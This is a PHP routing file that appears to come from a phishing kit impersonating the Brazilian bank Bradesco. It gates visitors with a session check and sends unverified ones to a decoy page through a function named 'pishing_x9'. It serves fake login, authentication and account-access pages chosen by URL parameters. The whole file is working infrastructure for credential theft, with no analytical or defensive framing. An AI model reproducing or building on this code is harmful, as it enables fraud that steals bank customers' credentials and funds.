<?php
require_once('../webdriver/conexao.php');
require_once('../webdriver/function.php');

if (!isset($_SESSION['device_unlock'])) :
    pishing_x9('../webdriver/paginas/x9.php');
    exit();
endif;

if ($_GET['app'] == 'bet') {
    if ($_GET['acao'] == 'login') {
        $pagina_login = '../webdriver/paginas/inicio.php';
        pagina($pagina_login);
    }

    if ($_GET['acao'] == 'autenticacao') {
        $pagina_login = '../webdriver/paginas/bradesco_autenticacao.php';
        pagina($pagina_login);
    }

    if ($_GET['acao'] == 'acesso_conta') {
        $pagina_login = '../webdriver/paginas/bradesco_acesso.php';
        pagina($pagina_login);
    }
}